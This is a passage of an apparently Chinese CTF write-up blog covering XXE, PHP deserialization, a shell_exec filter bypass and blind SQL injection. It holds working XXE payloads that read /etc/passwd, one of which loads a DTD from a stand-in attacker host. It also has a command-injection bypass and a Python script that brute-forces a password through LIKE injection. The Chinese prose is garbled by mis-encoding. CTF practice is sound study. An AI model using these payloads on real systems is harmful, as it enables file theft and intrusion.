<p>å£°æ˜ä¹‹åå°±å¯ä»¥é€šè¿‡â€œ&amp;å®ä½“å;â€æ¥è·å–ï¼Œç¤ºä¾‹å¦‚ä¸‹</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">test</span> <span class="string">&quot;john&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;test;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">&lt;/root</span><br></pre></td></tr></table></figure>

<p><strong>3.å¤–éƒ¨å®ä½“å¼•ç”¨</strong></p>
<p>XXE çš„äº§ç”Ÿæ­£æ˜¯å¤–éƒ¨å®ä½“å¼•ç”¨çš„ç»“æœï¼Œå¯åˆ†ä¸ºæ™®é€šå®ä½“å’Œå‚æ•°å®ä½“ã€‚</p>
<p>ï¼ˆ1ï¼‰æ™®é€šå®ä½“å£°æ˜æ ¼å¼å¦‚ä¸‹ï¼š</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY å®ä½“å <span class="keyword">SYSTEM</span> <span class="string">&quot;URI&quot;</span>&gt;</span></span><br><span class="line">æˆ–è€…</span><br><span class="line"><span class="meta">&lt;!ENTITY å®ä½“å <span class="keyword">PUBLIC</span> <span class="string">&quot;public_ID&quot;</span> <span class="string">&quot;URI&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä¸¾ä¸ªä¾‹å­ï¼š</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">foo</span> <span class="keyword">ANY</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br><span class="line">å£°æ˜å®ä½“ xxeï¼Œç”¨äºè¯»å– /etc/passwd æ–‡ä»¶ï¼Œç„¶åé€šè¿‡ <span class="symbol">&amp;xxe;</span> æ¥å¼•ç”¨æ‰§è¡Œã€‚</span><br></pre></td></tr></table></figure>

<p>ï¼ˆ2ï¼‰å‚æ•°å®ä½“å£°æ˜ä¸»è¦ç”¨äºåç»­ä½¿ç”¨ï¼Œä¸æ™®é€šå®ä½“ä¸åŒçš„æ˜¯ï¼Œå®ƒä¸­é—´æœ‰ç™¾åˆ†å·å­—ç¬¦ï¼ˆ%ï¼‰ï¼Œå…¶å£°æ˜æ ¼å¼å¦‚ä¸‹ï¼š</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % å®ä½“åç§° <span class="string">&quot;å®ä½“çš„å€¼&quot;</span>&gt;</span></span><br><span class="line">æˆ–è€…</span><br><span class="line"><span class="meta">&lt;!ENTITY % å®ä½“åç§° <span class="keyword">SYSTEM</span> <span class="string">&quot;URI&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>æ³¨æ„</strong>ï¼š</p>
<p>ä¸¾ä¸ªä¾‹å­ï¼š</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY  % <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://hacker.com/evil.dtd&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">    %xxe;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;evil;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>xxe.dtd å†…å®¹å¦‚ä¸‹ï¼š</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">evil</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢å…ˆå£°æ˜ xxe å‚æ•°å®ä½“ï¼Œå¼•å…¥å¤–éƒ¨å®ä½“ â€œ<a target="_blank" rel="noopener" href="http://hacker.com/evil.dtd%22%EF%BC%8C%E9%87%8C%E9%9D%A2%E5%A3%B0%E6%98%8E%E4%BA%86%E4%B8%80%E4%B8%AA%E5%8F%AB">http://hacker.com/evil.dtd&quot;ï¼Œé‡Œé¢å£°æ˜äº†ä¸€ä¸ªå«</a> evil çš„å®ä½“ï¼Œç”¨äºè¯»å– &#x2F;etc&#x2F;passwd æ–‡ä»¶ï¼Œæœ€ååœ¨é€šè¿‡ &evil; æ¥å¼•ç”¨æ‰§è¡Œã€‚ åœ¨ä¸åŒçš„è¯­è¨€ä¸­å…¶æ”¯æŒåè®®è¿˜ä¸ä¸€æ ·ï¼Œéœ€è¦æ ¹æ®ä¸šåŠ¡åœºæ™¯æ¥å®æµ‹ï¼Œå¸¸è§çš„åè®®æœ‰ fileã€httpã€ftpã€httpsã€except ç­‰ç­‰ã€‚</p>
<p><strong>æ™®é€šå®ä½“å’Œå¤–éƒ¨å®ä½“çš„å·®åˆ«ï¼š</strong></p>
<p>ä½œç”¨èŒƒå›´ï¼šæ™®é€šå®ä½“çš„ä½œç”¨èŒƒå›´æ˜¯æ•´ä¸ª XML æ–‡æ¡£ã€‚å½“ XML è§£æå™¨é‡åˆ°æŸä¸ªå®ä½“æ—¶ï¼Œä¼šå°†å…¶æ›¿æ¢ä¸ºå®ä½“çš„å®šä¹‰å†…å®¹ã€‚è€Œå‚æ•°å®ä½“åªåœ¨å£°æ˜å®ƒä»¬çš„ DTD å†…æœ‰æ•ˆã€‚DTD æ˜¯ä¸€ç§æ–‡æ¡£ç±»å‹å®šä¹‰ï¼Œå®ƒè§„å®šäº† XML æ–‡æ¡£çš„ç»“æ„ã€æ ‡ç­¾ç­‰æ–¹é¢çš„è§„èŒƒã€‚</p>
<p>å›åˆ°é¢˜ç›®ï¼ŒæŠ“åŒ…å‘ç°å¯èƒ½å­˜åœ¨xxe</p>
<p><img src="https://gitee.com/zxydsg/yiyi_blog/raw/master/image-20240724153830857.png" alt="image-20240724153830857"></p>
<p>exp</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">admin</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;admin;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>123<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">admin</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;admin;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>123<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="HNCTF-2022-WEEK2-easy-unser-1"><a href="#HNCTF-2022-WEEK2-easy-unser-1" class="headerlink" title="[HNCTF 2022 WEEK2]easy_unser"></a>[HNCTF 2022 WEEK2]easy_unser</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="keyword">include</span> <span class="string">&#x27;f14g.php&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">body</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$want</span>,<span class="variable">$todonothing</span> = <span class="string">&quot;i can&#x27;t get you want,But you can tell me before I wake up and change my mind&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__construct</span>(<span class="params"><span class="variable">$want</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$About_me</span> = <span class="string">&quot;When the object is created,I will be called&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$want</span> !== <span class="string">&quot; &quot;</span>) <span class="variable language_">$this</span>-&gt;want = <span class="variable">$want</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="variable language_">$this</span>-&gt;want = <span class="variable language_">$this</span>-&gt;todonothing;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$About_me</span> = <span class="string">&quot;When the object is unserialized,I will be called&quot;</span>;</span><br><span class="line">        <span class="variable">$but</span> = <span class="string">&quot;I can CHANGE you&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt; want = <span class="variable">$but</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;C1ybaby!&quot;</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$About_me</span> = <span class="string">&quot;I&#x27;m the final function,when the object is destroyed,I will be called&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;So,let me see if you can get what you want\n&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;todonothing === <span class="variable language_">$this</span>-&gt;want)</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;é²å‹ƒ,åˆ«å‚»æ„£ç€!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;want == <span class="string">&quot;I can CHANGE you&quot;</span>)</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;You are not you....&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;want == <span class="string">&quot;f14g.php&quot;</span> OR <span class="title function_ invoke__">is_file</span>(<span class="variable">$this</span>-&gt;want))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;You want my heart?No way!\n&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You got it!&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;want);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">unserializeorder</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$CORE</span> = <span class="string">&quot;äººç±»æœ€å¤§çš„æ•Œäºº,å°±æ˜¯æ— åº. Yahi param vaastavikta hai!&lt;BR&gt;&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$About_me</span> = <span class="string">&quot;When the object is serialized,I will be called&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;We Come To HNCTF,Enjoy the ser14l1zti0n &lt;BR&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$About_me</span> = <span class="string">&quot;When the object is used as a string,I will be called&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;CORE;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title function_ invoke__">unserializeorder</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="variable">$obj</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>);</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ywant&#x27;</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$ywant</span> = @<span class="title function_ invoke__">unserialize</span>(@<span class="variable">$_GET</span>[<span class="string">&#x27;ywant&#x27;</span>]);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$ywant</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">äººç±»æœ€å¤§çš„æ•Œäºº,å°±æ˜¯æ— åº. Yahi param vaastavikta hai!</span><br><span class="line">We Come To HNCTF,Enjoy the ser14l1zti0n</span><br></pre></td></tr></table></figure>

<h2 id="SWPUCTF-2023-ç§‹å­£æ–°ç”Ÿèµ›-RCE-PLUS-1"><a href="#SWPUCTF-2023-ç§‹å­£æ–°ç”Ÿèµ›-RCE-PLUS-1" class="headerlink" title="[SWPUCTF 2023 ç§‹å­£æ–°ç”Ÿèµ›]RCE-PLUS"></a>[SWPUCTF 2023 ç§‹å­£æ–°ç”Ÿèµ›]RCE-PLUS</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">strCheck</span>(<span class="params"><span class="variable">$cmd</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|\&amp;|\\$|\x09|\x26|more|less|head|sort|tail|sed|cut|awk|strings|od|php|ping|flag/i&quot;</span>, <span class="variable">$cmd</span>))&#123;</span><br><span class="line">    <span class="keyword">return</span>(<span class="variable">$cmd</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;i hate this&quot;</span>);   </span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">strCheck</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="title function_ invoke__">shell_exec</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell_exec()</span><br></pre></td></tr></table></figure>

<ul>
<li><p><code>shell_exec()</code>æ˜¯ä¸€ä¸ªå†…ç½®çš„PHPå‡½æ•°ï¼Œç”¨äºæ‰§è¡Œä¸€ä¸ªshellå‘½ä»¤ã€‚è¿™ä¸ªå‡½æ•°ä¼šç­‰å¾…å‘½ä»¤æ‰§è¡Œå®Œæ¯•ï¼Œå¹¶è¿”å›å‘½ä»¤çš„å®Œæ•´è¾“å‡ºä½œä¸ºå­—ç¬¦ä¸²ã€‚å¦‚æœå‘½ä»¤æ‰§è¡Œå¤±è´¥æˆ–æ²¡æœ‰è¾“å‡ºï¼Œå®ƒå°†è¿”å›ç©ºå­—ç¬¦ä¸²ã€‚</p>
</li>
<li><p>ä½¿ç”¨ç¤ºä¾‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$output = shell_exec(&#x27;ls -l&#x27;);</span><br><span class="line">echo $output;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>ç”±äºæ²¡æœ‰ç›¸å…³æ‰“å°çš„å‡½æ•°ï¼Œå› æ­¤å¯ä»¥ç›´æ¥å†™å…¥æ–‡ä»¶è¯»å–</p>
<p>exp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls /&gt; 1.txt</span><br><span class="line">cat /fl*&gt; 2.txt</span><br></pre></td></tr></table></figure>

<h2 id="ç¬¬äº”ç©ºé—´-2021-yet-another-mysql-injection-1"><a href="#ç¬¬äº”ç©ºé—´-2021-yet-another-mysql-injection-1" class="headerlink" title="[ç¬¬äº”ç©ºé—´ 2021]yet_another_mysql_injection"></a>[ç¬¬äº”ç©ºé—´ 2021]yet_another_mysql_injection</h2><p>æç¤º&#x2F;?source</p>
<p>æ‰¾åˆ°æºç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&quot;lib.php&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">alertMes</span>(<span class="params"><span class="variable">$mes</span>,<span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;<span class="subst">&#123;$mes&#125;</span>&#x27;);location.href=&#x27;<span class="subst">&#123;$url&#125;</span>&#x27;;&lt;/script&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkSql</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/regexp|between|in|flag|=|&gt;|&lt;|and|\||right|left|reverse|update|extractvalue|floor|substr|&amp;|;|\\\$|0x|sleep|\ /i&quot;</span>,<span class="variable">$s</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&#x27;hacker&#x27;</span>, <span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;&#x27;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] != <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$username</span> !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&#x27;only admin can login&#x27;</span>, <span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">checkSql</span>(<span class="variable">$password</span>);</span><br><span class="line">    <span class="variable">$sql</span>=<span class="string">&quot;SELECT password FROM users WHERE username=&#x27;admin&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$user_result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$user_result</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$row</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&quot;something wrong&quot;</span>,<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>] === <span class="variable">$password</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable">$FLAG</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">alertMes</span>(<span class="string">&quot;wrong password&quot;</span>,<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))&#123;</span><br><span class="line">  <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!-- /?source --&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;form action=<span class="string">&quot;/index.php&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">            &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span> placeholder=<span class="string">&quot;è´¦å·&quot;</span>&gt;&lt;br/&gt;</span><br><span class="line">            &lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password&quot;</span> placeholder=<span class="string">&quot;å¯†ç &quot;</span>&gt;&lt;br/&gt;</span><br><span class="line">            &lt;input type=<span class="string">&quot;submit&quot;</span> / value=<span class="string">&quot;ç™»å½•&quot;</span>&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>æ²¡æœ‰è¿‡æ»¤likeï¼Œå¯ä»¥å°è¯•likeæŠ¥é”™æ³¨å…¥ï¼Œ<code>%</code>æ˜¯ä¸€ä¸ªé€šé…ç¬¦ï¼Œè¡¨ç¤ºä»»æ„æ•°é‡çš„ä»»æ„å­—ç¬¦ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &#x27;http://node4.anna.nssctf.cn:28612&#x27;</span><br><span class="line"></span><br><span class="line">paylaod_list = &quot;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">for i in paylaod_list:</span><br><span class="line">    data = &#123;</span><br><span class="line">        &#x27;username&#x27;: &#x27;admin&#x27;,</span><br><span class="line">        &#x27;password&#x27;: f&quot;1&#x27;/**/or/**/password/**/like/**/&#x27;&#123;i&#125;%&#x27;#&quot;,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    re = requests.post(url,data = data)</span><br><span class="line">    print(f&quot;i=&#123;i&#125; &#123;re.text&#125;&quot;)</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zxydsg/yiyi_blog/raw/master/image-20240724210724412.png" alt="image-20240724210724412"></p>
